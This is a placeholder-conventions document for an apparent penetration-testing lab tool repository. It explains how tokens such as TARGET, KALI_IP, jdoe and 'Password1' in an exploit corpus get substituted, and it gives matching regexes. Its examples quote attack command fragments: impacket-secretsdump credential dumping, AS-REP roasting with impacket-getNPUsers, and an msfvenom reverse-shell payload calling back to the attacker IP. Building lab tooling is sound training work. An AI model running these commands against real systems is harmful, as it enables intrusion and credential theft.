# substitutions.md — corpus placeholder conventions

Single source of truth for the six conventional placeholders used across the
exploitdb corpus (`exploitdb/data/seed/*.json`). Every tool that renders a
corpus command or rewrites an exploit consumes this table.

Consumers (current + planned):
- `lib/stuckr_rank.py` — substitutes when rendering "untried next moves"
- `lib/exploitfixr_classify.py` — `network-substitution` fix entries
- `livefetch` (planned) — when surfacing fetched commands
- `controlpanelr` (planned) — when rendering submission helpers

Authoring rules:
- This file describes what is *in the corpus today*, not house style for new
  docs. AGENTS.md §10 names `corp.com` as the docs example domain; the corpus
  uses `corp.local` because OffSec AD labs are `.local` realm. Keep both.
- Counts below are from a literal regex pass over all 444 entries
  (`exploitdb/data/seed/*.json`) as of 2026-05-20. Re-run the survey before
  adding a seventh placeholder.

---

## The six placeholders

| # | Placeholder        | Role             | Substitute with                                            | Corpus uses |
|---|--------------------|------------------|------------------------------------------------------------|-------------|
| 1 | `TARGET`           | target IP        | state.ip (per-target state vector)                         | 215         |
| 2 | `corp.local`       | AD domain (FQDN) | state.domain (global state)                                | 137         |
| 3 | `KALI_IP`          | attacker IP      | `$KALI_IP` env, else `ip -4 addr show tun0`                | 105         |
| 4 | `jdoe`             | example username | first valid cred from state.creds (`user:pass` form)       | 53          |
| 5 | `'Password1'`      | example password | matching password from state.creds (preserve single quotes)| 65          |
| 6 | `10.10.10/11/12/13.x` | HTB-style lab IP | state.ip (target IP)                                    | 255 (.10.x) |

### Hard exclusion

`10.10.14.x` is the **Kali/attacker side of the OffSec+ VPN** and is **never
substituted**. Any tool that touches commands must preserve `10.10.14.x`
literal addresses byte-for-byte. Verified in stuckr_rank.py:234-238 and
confirmed by 18 deliberate uses in the corpus (msfvenom LHOST examples,
listener bind addresses, reverse-shell payload templates).

---

## Per-placeholder provenance

### 1. `TARGET`
- **What:** bare uppercase token used as a target-IP placeholder.
- **Provenance:** 215 occurrences across all 11 seed files. Highest density
  in `recon_enum.json`, `web_exploits.json`, `active_directory.json`.
- **Canonical context:** `nxc smb TARGET -u jdoe -p 'Password1'`,
  `nmap -sV -p- TARGET`, `curl -sk https://TARGET/...`.
- **Substitution rule:** replace bare-word `TARGET` (and `TARGET_IP`,
  `<TARGET>`, `<TARGET_IP>`, `<IP>`, `<RHOST>`, `<HOST>` — 13+12+18 minor
  variants) with the bound target IP.

### 2. `corp.local`
- **What:** AD realm/domain literal for the example lab forest.
- **Provenance:** 137 occurrences, mostly under `active_directory.json` and
  in Kerberos/LDAP/SMB commands. Established convention since the seed JSONs
  were authored; `corp.com` does not appear in corpus commands.
- **Canonical context:** `-d corp.local`, `--dc-ip TARGET`,
  `impacket-getNPUsers corp.local/jdoe -dc-ip TARGET`.
- **Substitution rule:** replace bare-word `corp.local` (and `<DOMAIN>`)
  with `state.domain` when populated. If no domain is known, leave literal
  so the operator sees the placeholder unchanged.
- **Style note:** AGENTS.md §10 reserves `corp.com` for *docs/examples*.
  This is a deliberate split — corpus commands stay `corp.local` (lab
  realism), prose/docs stay `corp.com` (style guide). Do not "unify" them.

### 3. `KALI_IP`
- **What:** uppercase token for the attacker/Kali tun0 address.
- **Provenance:** 105 occurrences in msfvenom, listener, file-transfer, and
  reverse-shell commands. Surfaced separately from `TARGET` because it is
  operator-side, not target-side.
- **Canonical context:** `msfvenom -p windows/x64/shell_reverse_tcp
  LHOST=KALI_IP LPORT=443 ...`, `python3 -m http.server` (printed alongside
  `http://KALI_IP:8080/...`).
- **Substitution rule:** replace with `$KALI_IP` if set, else
  `ip -4 addr show tun0 | awk '/inet /{print $2}' | cut -d/ -f1`. If neither
  resolves, leave literal — operator-visible `KALI_IP` is safer than a
  silent guess.
- **Adjacent variants:** `ATTACKER_IP` (10 uses) treated as a synonym;
  substitute identically.

### 4. `jdoe`
- **What:** example unprivileged AD username.
- **Provenance:** 53 occurrences, paired with `'Password1'` in 49 of those
  53 commands. Used in `nxc`, `impacket-*`, `smbclient`, `evil-winrm`, and
  Kerberos commands.
- **Canonical context:** `nxc smb TARGET -u jdoe -p 'Password1'`,
  `impacket-secretsdump corp.local/jdoe:'Password1'@TARGET`.
- **Substitution rule:** parse `state.creds` for the first `user:pass`
  line; substitute the `user` part for bare-word `jdoe` (and `<USER>`,
  `<USERNAME>` — 42 variants).
- **Edge:** if `jdoe` appears in a file path (`/home/jdoe/...`), still
  substitute — the cred is the intended subject in every observed case.

### 5. `'Password1'`
- **What:** single-quoted example password literal.
- **Provenance:** 65 occurrences. The single quotes matter — bash word
  splitting eats `P@ssw0rd!` etc. without them. Quoting is part of the
  placeholder, not incidental.
- **Canonical context:** `-p 'Password1'`, `-H 'aad3b...:31d6cfe...'`
  (hash form is the same convention — single-quoted literal).
- **Substitution rule:** replace the entire token `'Password1'` (quotes
  included) with `'<actual-password>'` from state.creds. Always preserve
  the single quotes — bare-word substitution into commands that contain
  shell metacharacters will silently corrupt the payload.
- **Adjacent variant:** `P@ssw0rd` (18 uses, no quotes) treated identically
  but watch for shell metacharacters during substitution.

### 6. `10.10.10/11/12/13.x` (HTB-style lab IPs)
- **What:** RFC1918 lab subnets used as concrete target-IP examples in
  older corpus entries (predates standardization on `TARGET` token).
- **Provenance:** 255 hits for `10.10.10.x` alone; `10.10.11/12/13.x`
  account for the rest. ExploitDB and HTB writeup conventions both default
  to `10.10.10.x` for lab targets, hence the heavy skew.
- **Canonical context:** `searchsploit -m 12345 # tested on 10.10.10.5`,
  hardcoded URLs in PoCs (`http://10.10.10.5/admin/login.php`).
- **Substitution rule:** replace any `10.10.10.x`, `10.10.11.x`,
  `10.10.12.x`, `10.10.13.x` octet with the bound target IP.
- **Hard exclusion:** `10.10.14.x` (18 uses) is the Kali VPN address space
  and is **NEVER substituted**. The regex must explicitly carve it out.
  Reference implementation: `lib/stuckr_rank.py:236-238`.

---

## Reference regex (shared with exploitfixr_classify.py)

```python
# Matches a corpus-style target IP that SHOULD be substituted.
# Explicitly excludes 10.10.14.x.
TARGET_IP_RE = re.compile(
    r'\b(?:10\.10\.(?:10|11|12|13)\.\d+'
    r'|192\.168\.\d+\.\d+'
    r'|172\.16\.\d+\.\d+'
    r'|<TARGET(?:_IP)?>|<IP>|<RHOST>|<HOST>)\b'
)

# Matches the bare TARGET token (separate from IP literals).
TARGET_TOKEN_RE = re.compile(r'\bTARGET(?:_IP)?\b')

# Matches the KALI side — used to ASSERT NON-MATCH on these.
KALI_IP_RE = re.compile(r'\b10\.10\.14\.\d+\b')
```

Any new consumer of this table must reuse these regexes verbatim. Forking
the regex is the path to a 10.10.14.x substitution bug, which is a
silently-broken reverse shell at 3am.
